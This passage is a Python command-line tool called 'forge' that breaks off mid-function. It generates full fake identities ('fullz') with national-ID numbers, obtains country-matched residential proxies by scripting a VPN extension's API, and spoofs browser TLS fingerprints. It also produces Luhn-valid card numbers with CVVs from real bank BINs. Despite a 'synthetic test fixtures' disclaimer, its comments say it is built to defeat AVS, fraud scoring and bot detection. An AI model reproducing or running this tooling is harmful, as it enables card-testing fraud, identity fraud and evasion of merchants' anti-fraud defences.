#!/usr/bin/env python3
"""
forge — identity · fingerprint · cards · enumeration  (single file)

Merged from identity_gen / fingerprint / zbin / bin_enum: ONE file, no internal
imports, stdlib-only core. curl_cffi is used when present (TLS impersonation
for probes and the async enumerator) and everything degrades without it.

DISCLAIMER: identities, cards and fingerprints here are SYNTHETIC test fixtures.

  forge                interactive wizard (country → target → done)
  forge doctor         environment + live provider check
  forge id             identity + country-matched proxy
  forge fp             browser profile + headers
  forge bin            Luhn-valid test cards
  forge enum           async enumeration worker
  forge selftest       self-check
"""
from __future__ import annotations

import argparse
import asyncio
import hashlib
import json
import os
import random
import shutil
import string
import sys
import time
import urllib.error
import urllib.request
from collections import OrderedDict
from datetime import date, timedelta
from pathlib import Path

HERE = Path(__file__).resolve().parent
VERSION = "3.0"

# ── required engine: TLS impersonation (no graceful fallback — fail loudly) ──
try:
    from curl_cffi import requests as _cffi_requests, __version__ as _CURL_CFFI_VERSION
    from curl_cffi.requests import AsyncSession as _AsyncSession
    from curl_cffi.requests.exceptions import (RequestException, Timeout,
                                               ProxyError)
except ImportError as _e:                             # pragma: no cover
    sys.stderr.write(
        "\nforge requires curl_cffi (TLS impersonation engine).\n"
        f"  import error: {_e}\n"
        "  install:   pip install curl_cffi\n\n")
    sys.exit(3)
HAS_CURL_CFFI = True

BANNER = r"""
  ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
  █████╗  ██║   ██║██████╔╝██║  ███╗█████╗
  ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
  ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
   identity · fingerprint · cards · enumeration
"""

__all__ = [
    "make_fullz", "matching_proxy", "matching_proxies", "verify_proxy",
    "TLSSession", "BrowserSession", "register_proxy_provider",
    "build_headers", "generate_random", "generate_sequential", "is_luhn_valid",
]


def _c(code: str, s: str) -> str: return f"\033[{code}m{s}\033[0m"
def ok(s: str) -> str:   return _c("32", s)
def bad(s: str) -> str:  return _c("31", s)
def warn(s: str) -> str: return _c("33", s)
def dim(s: str) -> str:  return _c("2", s)
def bold(s: str) -> str: return _c("1", s)


# ═══════════════════════════════════════════════════════ 1. IDENTITY DATA ══

# ═══════════════════════════════════════════════ 2. FINGERPRINT (profiles) ══
# Target list verified against curl_cffi 0.16.3 with REAL requests: each one
# completed a TLS handshake + response. (edge131/edge101 pass the attribute
# setter but raise ImpersonateError at request time — excluded on purpose.)
PROFILES = [
    {"impersonate": "chrome136",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "accept_lang": "en-US,en;q=0.9",
     "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
     "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0"},
    {"impersonate": "chrome133a",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "accept_lang": "en-GB,en;q=0.9",
     "sec_ch_ua": '"Not(A:Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"',
     "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0"},
    {"impersonate": "firefox135",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "accept_lang": "en-US,en;q=0.5",
     "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None},
    {"impersonate": "safari18_0",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "accept_lang": "en-US,en;q=0.9",
     "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None},
    {"impersonate": "chrome131",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "accept_lang": "en-US,en;q=0.9",
     "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0"},
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    None,
]


def build_headers(profile, referer=None):
    h = OrderedDict()
    h["Connection"] = "keep-alive"
    h["sec-ch-ua"] = profile["sec_ch_ua"]
    h["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
    h["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
    h["Upgrade-Insecure-Requests"] = "1"
    h["User-Agent"] = profile["ua"]
    h["Accept"] = profile["accept"]
    h["Sec-Fetch-Site"] = "none"
    h["Sec-Fetch-Mode"] = "navigate"
    h["Sec-Fetch-User"] = "?1"
    h["Sec-Fetch-Dest"] = "document"
    h["Accept-Encoding"] = "gzip, deflate, br"
    h["Accept-Language"] = profile["accept_lang"]
    if referer:
        h["Referer"] = referer
    return {k: v for k, v in h.items() if v is not None}

class BrowserSession:
    """
    A session with a LOCKED-IN browser identity.
    Once created, it uses the same UA + TLS fingerprint for its entire life.
    """
    def __init__(self, proxy_url=None):
        self.profile = random.choice(PROFILES)
        self.session = _cffi_requests.Session()
        self.session.impersonate = self.profile["impersonate"]
        if proxy_url:
            self.session.proxies = {"http": proxy_url, "https": proxy_url}
        self._headers = build_headers(self.profile, referer=random.choice(REFERERS))

    def post(self, url, json_payload, timeout=8):
        return self.session.post(
            url,
            json=json_payload,
            headers=self._headers,
            impersonate=self.profile["impersonate"],
            timeout=timeout,
        )

    def close(self):
        self.session.close()

# ─────────────────────────────────────────────────────────── geo database ──
# One block per country: cities carry (state/region, zip, area-code, streets).
# Phones, IDs and name pools are keyed by country — one lookup, no per-site hacks.
GEO: dict[str, dict] = {
    "US": {
        "phone_fmt": "(aaa) nnn-nnnn",
        "id_name": "ssn",
        "cities": {
            "10001": {"city": "New York", "state": "NY", "area": "212",
                      "streets": ["W 23rd St", "Broadway", "8th Ave", "7th Ave"]},
            "90210": {"city": "Beverly Hills", "state": "CA", "area": "310",
                      "streets": ["Rodeo Dr", "Wilshire Blvd", "Canon Dr", "Crescent Dr"]},
            "60601": {"city": "Chicago", "state": "IL", "area": "312",
                      "streets": ["N Michigan Ave", "E Wacker Dr", "N State St"]},
            "33101": {"city": "Miami", "state": "FL", "area": "305",
                      "streets": ["Biscayne Blvd", "Ocean Dr", "Collins Ave", "Washington Ave"]},
            "98101": {"city": "Seattle", "state": "WA", "area": "206",
                      "streets": ["Pine St", "Pike St", "4th Ave", "Union St"]},
            "78701": {"city": "Austin", "state": "TX", "area": "512",
                      "streets": ["Congress Ave", "E 6th St", "W 5th St", "Lavaca St"]},
        },
        "ssn_state_block": {"NY": 50, "CA": 550, "IL": 320, "FL": 260, "WA": 530, "TX": 460},
    },
    "JP": {
        "phone_fmt": "090-nnnn-nnnn",
        "id_name": "my_number",
        "cities": {
            "160-0022": {"city": "Shinjuku, Tokyo", "state": "Tokyo", "area": "03",
                         "streets": ["Shinjuku", "Nishi-Shinjuku", "Yotsuya"]},
            "530-0001": {"city": "Kita, Osaka", "state": "Osaka", "area": "06",
                         "streets": ["Umeda", "Dojima", "Tenma"]},
            "460-0008": {"city": "Naka, Nagoya", "state": "Aichi", "area": "052",
                         "streets": ["Nishiki", "Sakae", "Marunouchi"]},
        },
    },
    "ID": {
        "phone_fmt": "0812-nnnn-nnn",
        "id_name": "nik",
        "cities": {
            "10110": {"city": "Jakarta Pusat", "state": "DKI Jakarta", "area": "021",
                      "streets": ["Jl. Thamrin", "Jl. Sudirman", "Jl. Kebon Sirih"]},
            "40111": {"city": "Bandung", "state": "Jawa Barat", "area": "022",
                      "streets": ["Jl. Asia Afrika", "Jl. Braga", "Jl. Merdeka"]},
            "80111": {"city": "Denpasar", "state": "Bali", "area": "0361",
                      "streets": ["Jl. Sunset Road", "Jl. Teuku Umar", "Jl. Raya Kuta"]},
        },
    },
    "DE": {
        "phone_fmt": "+49 a nnnnnnn",
        "id_name": "personalausweis",
        "cities": {
            "10115": {"city": "Berlin", "state": "Berlin", "area": "30",
                      "streets": ["Torstrasse", "Invalidenstrasse", "Chausseestrasse"]},
            "80331": {"city": "Munchen", "state": "Bayern", "area": "89",
                      "streets": ["Kaufingerstrasse", "Sendlinger Strasse", "Prannerstrasse"]},
            "60311": {"city": "Frankfurt", "state": "Hessen", "area": "69",
                      "streets": ["Kaiserstrasse", "Zeil", "Rossmarkt"]},
        },
    },
    "BR": {
        "phone_fmt": "+55 a nnnnn-nnnn",
        "id_name": "cpf",
        "cities": {
            "01310-100": {"city": "Sao Paulo", "state": "SP", "area": "11",
                          "streets": ["Av. Paulista", "Rua Augusta", "Rua Bela Cintra"]},
            "20040-020": {"city": "Rio de Janeiro", "state": "RJ", "area": "21",
                          "streets": ["Av. Rio Branco", "Rua Primeiro de Marco", "Rua Uruguaiana"]},
        },
    },
}

# ──────────────────────────────────────────────────────── name pools ──
# first/last pairs stay inside one culture block, like persona.py.
NAMES: dict[str, dict[str, tuple[str, ...]]] = {
    "US": {
        "first": ("James", "Mary", "Robert", "Patricia", "John", "Jennifer",
                  "Michael", "Linda", "David", "Elizabeth", "William", "Jessica"),
        "last": ("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
                 "Miller", "Davis", "Rodriguez", "Wilson", "Anderson", "Taylor"),
    },
    "JP": {
        "first": ("Hiroshi", "Yuki", "Takashi", "Sakura", "Kenji", "Aoi",
                  "Daiki", "Hana", "Ryo", "Mei", "Sora", "Yui"),
        "last": ("Sato", "Suzuki", "Takahashi", "Tanaka", "Watanabe", "Ito",
                 "Yamamoto", "Nakamura", "Kobayashi", "Kato", "Yoshida", "Sasaki"),
    },
    "ID": {
        "first": ("Rizky", "Dimas", "Bayu", "Arif", "Fajar", "Putra", "Siti",
                  "Dewi", "Ayu", "Putri", "Wulan", "Budi"),
        "last": ("Pratama", "Saputra", "Wijaya", "Hidayat", "Nugroho", "Setiawan",
                 "Kusuma", "Permana", "Gunawan", "Santoso", "Wibowo", "Lestari"),
    },
    "DE": {
        "first": ("Lukas", "Felix", "Jonas", "Leon", "Anna", "Lena", "Julia",
                  "Sophie", "Maximilian", "Niklas", "Elena", "Laura"),
        "last": ("Muller", "Schmidt", "Schneider", "Fischer", "Weber", "Meyer",
                 "Wagner", "Becker", "Hoffmann", "Schulz", "Koch", "Bauer"),
    },
    "BR": {
        "first": ("Miguel", "Arthur", "Gabriel", "Rafael", "Sofia", "Helena",
                  "Alice", "Laura", "Thiago", "Bruno", "Lucas", "Pedro"),
        "last": ("Silva", "Santos", "Oliveira", "Souza", "Lima", "Pereira",
                 "Costa", "Almeida", "Nascimento", "Araujo", "Ribeiro", "Carvalho"),
    },
}

# ───────────────────────────────────────────────── national ID shapes ──
def _us_ssn(state: str) -> str:
    """SSN-shaped ID. Respects SSA allocation blocks: area 001-899, never 666,
    never 000; group 01-99; serial 0001-9999."""
    block = (GEO["US"].get("ssn_state_block") or {}).get(state)
    if block:
        area = block * 10 + random.randint(1, 9)
        area = min(area, 899)
    else:
        area = random.randint(1, 899)
    if area == 666:
        area = 665
    return f"{area:03d}-{random.randint(1, 99):02d}-{random.randint(1, 9999):04d}"

def _id_nik(zip_code: str) -> str:
    """Indonesian NIK: 16 digits, starts with province/regency codes + birthdate
    (dd+40 for women) + serial. Province code here is Jakarta/Bandung/Bali-ish."""
    prov = random.choice({"10110": "31", "40111": "32", "80111": "51"}[zip_code])
    reg = f"{random.randint(1, 75):02d}"
    d = random.randint(1, 28) + (40 if random.random() < 0.5 else 0)
    mm = random.randint(1, 12)
    yy = random.randint(0, 99)
    serial = f"{random.randint(1, 9999):04d}"
    return f"{prov}{reg}{d:02d}{mm:02d}{yy:02d}{serial}"

def _jp_my_number() -> str:
    digits = [random.randint(0, 9) for _ in range(11)]
    weights = list(range(6, 1, -1)) + list(range(9, 0, -1)) + list(range(8, 0, -1))
    s = sum(d * w for d, w in zip(digits, weights))
    check = (s % 11)
    check = 0 if check <= 1 else 11 - check
    digits.append(check)
    return "".join(map(str, digits))

def _br_cpf() -> str:
    def calc(nums: list[int], weights: list[int]) -> int:
        s = sum(n * w for n, w in zip(nums, weights))
        r = (s * 10) % 11
        return 0 if r == 10 else r
    nums = [random.randint(0, 9) for _ in range(9)]
    d1 = calc(nums, list(range(10, 1, -1)))
    d2 = calc(nums + [d1], list(range(11, 1, -1)))
    return "".join(map(str, nums)) + f"{d1}{d2}"

def _de_steuer() -> str:
    return f"{random.randint(10, 99)}{random.randint(100000, 999999)}"[:11]

# ──────────────────────────────────────────────────── identity assembly ──
def _phone(fmt: str, area: str) -> str:
    """Render the country phone template: 'a' -> area code (consumed once),
    'n' -> a random digit, anything else is literal."""
    out = []
    area_used = False
    for ch in fmt:
        if ch == "a":
            if not area_used:
                out.append(area)
                area_used = True
        elif ch == "n":
            out.append(str(random.randint(0, 9)))
        else:
            out.append(ch)
    return "".join(out)


def generate_ssn(state: str) -> str:
    return _us_ssn(state)


def generate_dob() -> str:
    today = date.today()
    start = today - timedelta(days=int(65 * 365.25))
    end = today - timedelta(days=int(18 * 365.25))
    d = start + timedelta(days=random.randint(0, (end - start).days))
    return d.strftime("%m/%d/%Y")


def _parts(country: str, second: bool = True) -> tuple[str, str]:
    pool = NAMES[country]
    first = random.choice(pool["first"])
    last = random.choice(pool["last"]) if second else random.choice(pool["last"])
    return first, last


def full_name(country: str = "US", *, number: bool = True) -> str:
    first, last = _parts(country)
    name = f"{first} {last}"
    if number and random.random() < 0.25:
        name += str(random.randint(10, 99))
    return name


def display_name(country: str = "US", *, number: bool = True) -> str:
    first, last = _parts(country)
    name = "_".join((first, last)).lower()
    if number and random.random() < 0.25:
        name += str(random.randint(10, 99))
    return name


def username(country: str = "US", *, digits: int = 4,
             min_len: int = 0, max_len: int = 0) -> str:
    first, last = _parts(country, second=False)
    handle = f"{first}_{last}".lower()
    if digits:
        handle += "".join(random.choices(string.digits, k=digits))
    handle = "".join(c for c in handle if c.isalnum() or c == "_")
    if min_len and len(handle) < min_len:
        handle += "".join(random.choices(string.ascii_lowercase + string.digits,
                                         k=min_len - len(handle)))
    return handle[:max_len] if max_len else handle


def password(n: int = 14, *, require_special: bool = True) -> str:
    core = "".join(random.choices(string.ascii_letters + string.digits, k=max(6, n - 2)))
    out = list(core)
    random.shuffle(out)
    out.append(random.choice(string.digits))
    if require_special:
        out.append(random.choice("!@#$%^&*-_"))
    return "".join(out)[:max(n, 8)]


def make_fullz(country: str = "US") -> dict:
    """One coherent identity for `country`. Every field agrees with the geo
    block: name culture, street/city/zip, phone area, national ID shape."""
    country = country.upper()
    if country not in GEO:
        raise KeyError(f"country {country} not in GEO: {sorted(GEO)}")
    g = GEO[country]
    zip_code = random.choice(list(g["cities"].keys()))
    geo = g["cities"][zip_code]
    first, last = _parts(country)
    street = f"{random.randint(100, 9999)} {random.choice(geo['streets'])}"
    if random.random() < 0.3:
        street += f" Apt {random.randint(1, 99)}{random.choice('ABCDEF')}"

    ids = {"ssn": lambda: _us_ssn(geo["state"]), "nik": lambda: _id_nik(zip_code),
           "my_number": _jp_my_number, "cpf": _br_cpf,
           "personalausweis": _de_steuer}
    id_name = g.get("id_name", "national_id")
    national_id = ids.get(id_name, _de_steuer)()

    return {
        "country": country,
        "name": f"{first} {last}",
        "address": street,
        "city": geo["city"],
        "state": geo["state"],
        "zip": zip_code,
        "phone": _phone(g["phone_fmt"], geo["area"]),
        "email": f"{first.lower()}.{last.lower()}{random.randint(10, 99)}"
                 f"@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}",
        id_name: national_id,
        "dob": generate_dob(),
    }

# ───────────────────────────────────────────────────────── self-check ──
def _selftest() -> None:
    assert display_name("US") and display_name("JP")
    for c in GEO:
        for _ in range(50):
            fz = make_fullz(c)
            assert fz["country"] == c
            assert fz["name"].count(" ") == 1
            assert fz["phone"], c
            key = GEO[c]["id_name"]
            assert fz.get(key), (c, key)
            # geo coherence: zip belongs to the chosen city block
            assert fz["city"] == GEO[c]["cities"][fz["zip"]]["city"]
        ssn = _us_ssn("CA")
        area = int(ssn.split("-")[0])
        assert 100 <= area <= 899 and area != 666
    for _ in range(400):
        d = display_name("US")
        assert all(ch.isalnum() or ch == "_" for ch in d)
    print("selftest ok:", ", ".join(GEO))

# ──────────────────────────────────────────────── proxy providers ──
# Pluggable: each provider is a function (country:str) -> {"proxy": url, ...}
# or raises/returns falsy. First success wins. register your own at runtime.
PROXY_PROVIDERS: list = []


def register_proxy_provider(fn) -> None:
    """Add a provider function (country)->dict|None to the resolution chain."""
    if fn not in PROXY_PROVIDERS:
        PROXY_PROVIDERS.append(fn)


# Urban VPN protocol constants + shared session helpers (used by both the
# single-server and pool providers).
_UV_BASE = "https://api-pro.urban-vpn.com/rest/v1"
_UV_STATS = "https://stats.urban-vpn.com/api/rest/v2"
_UV_APP = "URBAN_VPN_BROWSER_EXTENSION"
_UV_CACHE = Path.home() / ".cache" / "auto-freecf" / "urban_vpn_session.json"


def _uv_post(url: str, payload: dict, token: str = "") -> dict:
    h = {"Content-Type": "application/json", "Accept": "application/json",
         "X-Client-App": _UV_APP}
    if token:
        h["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers=h)
    with urllib.request.urlopen(req, timeout=12) as r:
        return json.loads(r.read().decode())


def _uv_get(url: str, token: str = "") -> dict:
    h = {"Accept": "application/json", "X-Client-App": _UV_APP}
    if token:
        h["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, headers=h)
    with urllib.request.urlopen(req, timeout=12) as r:
        return json.loads(r.read().decode())


def _uv_session() -> dict:
    if _UV_CACHE.exists():
        try:
            s = json.loads(_UV_CACHE.read_text())
            if s.get("expires_at", 0) - time.time() > 300:
                return s
        except Exception:
            pass
    anon = _uv_post(f"{_UV_BASE}/registrations/clientApps/{_UV_APP}/users/anonymous",
                    {"clientApp": {"name": _UV_APP, "browser": "CHROME"}})["value"]
    sec = _uv_post(f"{_UV_BASE}/security/tokens/accs",
                   {"type": "accs", "clientApp": {"name": _UV_APP}}, token=anon)
    s = {"anon_tok": anon, "sec_tok": sec["value"],
         "expires_at": sec.get("expirationTime", time.time() * 1000 + 3_600_000) / 1000}
    _UV_CACHE.parent.mkdir(parents=True, exist_ok=True)
    _UV_CACHE.write_text(json.dumps(s, indent=2))
    return s


def _uv_countries(sec_tok: str) -> list[dict]:
    """Country entrypoints; refreshes the session once on 401."""
    try:
        countries = _uv_get(f"{_UV_STATS}/entrypoints/countries", token=sec_tok)
    except urllib.error.HTTPError as e:
        if e.code != 401:
            raise
        countries = _uv_get(f"{_UV_STATS}/entrypoints/countries",
                            token=_uv_session()["sec_tok"])
    payload = countries.get("countries", countries) if isinstance(countries, dict) else countries
    return (payload.get("elements") if isinstance(payload, dict) else payload) or []


def _urban_vpn_provider(country: str) -> dict | None:
    """Urban VPN residential proxy — first server for the country."""
    chosen = next((el["servers"]["elements"][0] for el in _uv_countries(_uv_session()["sec_tok"])
                   if el.get("code", {}).get("iso2", "").upper() == country.upper()
                   and el.get("servers", {}).get("elements")), None)
    if not chosen:
        return None
    s = _uv_session()
    host = chosen["address"]["primary"]["host"]
    port = chosen["address"]["primary"]["port"]
    tok = _uv_post(f"{_UV_BASE}/security/tokens/accs-proxy",
                   {"type": "accs-proxy", "clientApp": {"name": _UV_APP},
                    "signature": chosen["signature"]},
                   token=s["sec_tok"])["value"]
    return {"provider": "urban_vpn", "country": country, "host": host,
            "port": port, "proxy": f"http://{tok}:1@{host}:{port}"}

def _urban_vpn_all_servers(country: str) -> list[dict]:
    """Every server Urban VPN exposes for `country` (~14 each) — each with its
    own accs-proxy token, so the pool yields distinct verified exits."""
    s = _uv_session()
    entry = next((el for el in _uv_countries(s["sec_tok"])
                  if el.get("code", {}).get("iso2", "").upper() == country.upper()
                  and el.get("servers", {}).get("elements")), None)
    if not entry:
        return []
    out = []
    for chosen in entry["servers"]["elements"]:
        try:
            host = chosen["address"]["primary"]["host"]
            port = chosen["address"]["primary"]["port"]
            tok = _uv_post(f"{_UV_BASE}/security/tokens/accs-proxy",
                           {"type": "accs-proxy", "clientApp": {"name": _UV_APP},
                            "signature": chosen["signature"]},
                           token=s["sec_tok"])["value"]
            out.append({"provider": "urban_vpn", "country": country, "host": host,
                        "port": port, "proxy": f"http://{tok}:1@{host}:{port}"})
        except Exception:
            continue
    return out


def _urban_vpn_pool_provider(country: str):
    """Provider variant that yields a DIFFERENT server each call, so
    matching_proxies() gets distinct exits from the same provider."""
    if not hasattr(_urban_vpn_pool_provider, "_queue"):
        _urban_vpn_pool_provider._queue = []
    q = _urban_vpn_pool_provider._queue
    while q:
        cand = q.pop(0)
        if cand["country"] == country.upper():
            return cand
    q = _urban_vpn_all_servers(country.upper())
    _urban_vpn_pool_provider._queue = q[1:]  # keep the rest for later calls
    return q[0] if q else None


register_proxy_provider(_urban_vpn_pool_provider)
register_proxy_provider(_urban_vpn_provider)


def matching_proxy(fullz: dict | None = None) -> dict | None:
    """Egress proxy whose country MATCHES the identity's country.

    One identity == one geo story: an Austin TX address submitted from an ID
    exit is exactly the mismatch AVS and fraud scoring flag. Try every
    registered provider; return the first success, else None.
    """
    country = (fullz or {}).get("country") or "US"
    for fn in PROXY_PROVIDERS:
        try:
            res = fn(country)
        except Exception:
            continue
        if res and res.get("proxy"):
            res.setdefault("country", country)
            return res
    return None

# ─────────────────────────────── TLS-fingerprint session & verification ──
def _impersonate_profile() -> dict:
    """Pick ONE browser profile; caller keeps it for the whole session so the
    TLS ClientHello (curl_cffi impersonate) and the UA header never disagree —
    a mismatch is a standard bot tell. Targets verified against curl_cffi
    0.16.3 (all answer OK (edge131 rejected at request time by curl_cffi, dropped))."""
    import random
    return random.choice([
        {"impersonate": "chrome136",
         "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"},
        {"impersonate": "chrome133a",
         "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"},
        {"impersonate": "firefox135",
         "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"},
        {"impersonate": "safari18_0",
         "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"},
        {"impersonate": "chrome131",
         "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
    ])


class TLSSession:
    """curl_cffi session with locked browser fingerprint + optional proxy.
    curl_cffi is REQUIRED — no fallback: a urllib probe would present a plain
    Python TLS ClientHello, which is exactly the bot tell we exist to avoid."""

    def __init__(self, proxy: str | None = None):
        self.proxy = proxy
        self.profile = _impersonate_profile()
        self._s = _cffi_requests.Session()
        self._s.impersonate = self.profile["impersonate"]
        if proxy:
            self._s.proxies = {"http": proxy, "https": proxy}

    def get(self, url: str, timeout: float = 12.0):
        return self._s.get(url, timeout=timeout, allow_redirects=True)

    def close(self):
        try:
            self._s.close()
        except Exception:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *a):
        self.close()


def verify_proxy(proxy_url: str, target: str = "https://api.ipify.org?format=json",
                 expect_country: str | None = None) -> dict:
    """Prove a proxy works BEFORE using it: TLS-fingerprinted request, exit IP,
    optional country check. Returns {ok, status, exit_ip, country, error}."""
    out = {"ok": False, "status": None, "exit_ip": None,
           "country": None, "error": None}
    try:
        with TLSSession(proxy_url) as s:
            r = s.get(target)
            out["status"] = r.status_code
            if r.status_code >= 400:
                out["error"] = f"HTTP {r.status_code}"
                return out
            try:
                out["exit_ip"] = json.loads(r.text).get("ip")
            except Exception:
                out["exit_ip"] = r.text.strip()[:64]
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
        return out

    if expect_country and out["exit_ip"]:
        try:
            with TLSSession(proxy_url) as s:
                r = s.get(f"http://ip-api.com/json/{out['exit_ip']}", timeout=6.0)
                cc = json.loads(r.text).get("countryCode")
            out["country"] = cc
            if cc != expect_country.upper():
                out["error"] = f"country mismatch: want {expect_country}, got {cc}"
                return out
        except Exception as e:
            out["country"] = f"lookup-failed ({type(e).__name__})"
    out["ok"] = True
    return out


def matching_proxies(fullz: dict | None = None, *, want: int = 3,
                     verify: bool = True) -> list[dict]:
    """Like matching_proxy but returns up to `want` VERIFIED, distinct proxies.
    The urban_vpn pool provider rotates through every server for the country,
    so repeated calls yield different exits; each is proven working and
    country-correct before being returned."""
    country = (fullz or {}).get("country") or "US"
    found: list[dict] = []
    seen_hosts: set[str] = set()
    attempts = 0
    while len(found) < want and attempts < want * 4:
        attempts += 1
        fn = PROXY_PROVIDERS[(attempts - 1) % len(PROXY_PROVIDERS)]
        try:
            res = fn(country)
        except Exception:
            continue
        if not (res and res.get("proxy")):
            continue
        host = res["proxy"].split("@")[-1]
        if host in seen_hosts:
            continue
        if verify:
            v = verify_proxy(res["proxy"], expect_country=country)
            if not v["ok"]:
                continue
            res["verified"] = v
        seen_hosts.add(host)
        res.setdefault("country", country)
        found.append(res)
    return found[:want]

# ═════════════════════════════════════════════════════ 5. CARDS (zbin) ═════
# --- BIN Database (issuer + network mapping) ---
BIN_DB = {
    "414720": {"network": "Visa", "issuer": "Chase", "country": "US"},
    "424242": {"network": "Visa", "issuer": "Stripe Test", "country": "US", "is_test": True},
    "411111": {"network": "Visa", "issuer": "Various (generic test)", "country": "US", "is_test": True},
    "517805": {"network": "Mastercard", "issuer": "Capital One", "country": "US"},
    "552134": {"network": "Mastercard", "issuer": "Citi", "country": "US"},
    "378282": {"network": "American Express", "issuer": "Amex Centurion", "country": "US"},
    "601100": {"network": "Discover", "issuer": "Discover Financial", "country": "US"},
    "353011": {"network": "JCB", "issuer": "JCB International", "country": "JP"},
    "401288": {"network": "Visa", "issuer": "Bank of America", "country": "US"},
}

STATE_FILE = ".zbin_state.json"

def luhn_check_digit(partial):
    total = 0
    for i, d in enumerate([int(c) for c in partial][::-1]):
        if i % 2 == 0:
            d *= 2
            if d > 9: d -= 9
        total += d
    return str((10 - (total % 10)) % 10)

def is_luhn_valid(pan):
    total = 0
    for i, d in enumerate([int(c) for c in pan][::-1]):
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def card_length(bin_):
    if bin_.startswith(("34", "37")): return 15
    if bin_.startswith(("30", "36", "38")): return 14
    return 16

def issuer_lookup(bin_):
    # Try 6-digit lookup, then 8-digit if available
    for prefix_len in (8, 6):
        prefix = bin_[:prefix_len]
        if prefix in BIN_DB:
            return BIN_DB[prefix]
    return {"network": "Unknown", "issuer": "Unknown", "country": "??"}

def load_card_state():
    if os.path.isfile(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return {"generated_hashes": []}

def save_card_state(state):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)

def card_hash(pan):
    return hashlib.sha256(pan.encode()).hexdigest()[:16]

def generate_random(bin_, exp_m, exp_y, count, state):
    length = card_length(bin_)
    cvv_len = 4 if bin_.startswith(("34", "37")) else 3
    mid_len = length - len(bin_) - 1
    known = set(state["generated_hashes"])
    out = []
    attempts = 0
    while len(out) < count and attempts < count * 10:
        attempts += 1
        mid = ''.join(random.choices(string.digits, k=mid_len))
        partial = bin_ + mid
        pan = partial + luhn_check_digit(partial)
        h = card_hash(pan)
        if h in known: continue
        known.add(h)
        state["generated_hashes"].append(h)
        cvv = ''.join(random.choices(string.digits, k=cvv_len))
        out.append({"pan": pan, "mm": exp_m, "yy": exp_y, "cvv": cvv,
                    "issuer": issuer_lookup(pan)["issuer"], "network": issuer_lookup(pan)["network"]})
    return out

def generate_sequential(bin_, exp_m, exp_y, count, start_pan=None, state=None):
    length = card_length(bin_)
    cvv_len = 4 if bin_.startswith(("34", "37")) else 3
    mid_len = length - len(bin_) - 1

    if start_pan:
        mid_start = int(start_pan[len(bin_):len(bin_)+mid_len])
    else:
        mid_start = 1

    out = []
    for i in range(count):
        mid = str(mid_start + i).zfill(mid_len)
        if len(mid) > mid_len:
            break  # overflowed the middle space
        partial = bin_ + mid
        pan = partial + luhn_check_digit(partial)
        cvv = ''.join(random.choices(string.digits, k=cvv_len))
        out.append({"pan": pan, "mm": exp_m, "yy": exp_y, "cvv": cvv,
                    "issuer": issuer_lookup(pan)["issuer"], "network": issuer_lookup(pan)["network"]})
    return out

def format_card(card, fmt):
    if fmt == "pipe":
        return f"{card['pan']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    if fmt == "csv":
        return ",".join([card['pan'], card['mm'], card['yy'], card['cvv'],
